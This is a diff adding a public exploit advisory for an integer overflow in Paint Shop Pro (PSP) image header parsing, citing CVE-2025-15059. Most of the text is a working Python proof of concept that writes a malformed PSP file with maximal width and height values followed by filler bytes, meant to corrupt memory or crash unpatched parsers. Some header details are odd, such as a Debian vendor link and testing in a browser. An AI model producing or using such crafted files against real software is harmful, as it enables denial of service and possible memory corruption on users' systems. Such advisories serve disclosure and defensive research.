@@ -1,0 +1,56 @@
+=============================================================================================================================================
+| # Title     : Integer Overflow in Paint Shop Pro (PSP) Image Header Parsing Leading to Potential Memory Corruption                        |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.debian.org/security                                                                                             |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/214597/ & CVE-2025-15059
+
+[+] Summary    : A vulnerability was identified in the handling of Paint Shop Pro (PSP) image files due to insufficient validation of image header fields. Specifically, 
+                 the application fails to properly validate large width and height values supplied in the PSP file header. 
+				 When these values are used in arithmetic operations (such as calculating buffer sizes based on width × height × bytes-per-pixel), an integer overflow may occur. 
+				 This can result in incorrect memory allocation, leading to memory corruption or application crashes. Under certain conditions, 
+				 this flaw could be leveraged to achieve denial of service and potentially further memory safety violations. 
+                 The issue arises from missing bounds checking and the use of insufficiently wide integer types during size calculations.
+
+[+] POC : python poc.py
+
+#!/usr/bin/env python3
+import struct
+import sys
+
+def create_malicious_psp(filename):
+
+    header = b'Paint Shop Pro Image File\n\x1a\x00\x00\x00'
+
+    header += b'\x05\x00'
+
+    width = 0xFFFFFFFF  
+    height = 0xFFFFFFFF 
+
+    header += struct.pack('<II', width, height)
+
+    header += b'\xFF\x00'
+    malicious_data = b'A' * 10000  
+    
+    try:
+        with open(filename, 'wb') as f:
+            f.write(header)
+            f.write(malicious_data)
+        
+        print(f"[+] Malicious PSP file created: {filename}")
+        print("[!] WARNING: For research only. Do not open in unpatched software.")
+    except Exception as e:
+        print(f"[-] Error writing file: {e}")
+
+if __name__ == "__main__":
+    if len(sys.argv) != 2:
+        print("Usage: python3 poc.py <filename.psp>")
+        sys.exit(1)
+    
+    create_malicious_psp(sys.argv[1])
+	
+Greetings to :============================================================
+jericho * Larry W. Cashdollar * r00t * Malvuln (John Page aka hyp3rlinx)*|
+==========================================================================
